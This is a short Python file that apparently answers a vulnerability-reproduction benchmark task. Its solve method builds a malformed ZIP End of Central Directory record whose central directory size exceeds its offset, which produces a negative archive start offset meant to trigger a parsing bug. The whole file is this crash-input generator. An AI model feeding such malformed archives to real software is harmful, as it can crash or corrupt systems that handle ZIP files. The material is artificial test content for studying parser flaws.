import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a ZIP End of Central Directory (EOCD) record with a central directory size
        # larger than its offset to create a negative archive start offset.
        # EOCD structure (22 bytes) + 24-byte comment = 46 bytes total.
        eocd_signature = struct.pack('<I', 0x06054B50)  # 'PK\x05\x06'
        disk_number = struct.pack('<H', 0)
        cd_start_disk = struct.pack('<H', 0)
        entries_on_disk = struct.pack('<H', 1)
        total_entries = struct.pack('<H', 1)
        central_dir_size = struct.pack('<I', 46)  # size > offset to induce negative start offset
        central_dir_offset = struct.pack('<I', 0)
        comment_length = struct.pack('<H', 24)    # make total length 46 bytes
        comment = b'A' * 24

        eocd = (
            eocd_signature +
            disk_number +
            cd_start_disk +
            entries_on_disk +
            total_entries +
            central_dir_size +
            central_dir_offset +
            comment_length +
            comment
        )
        return eocd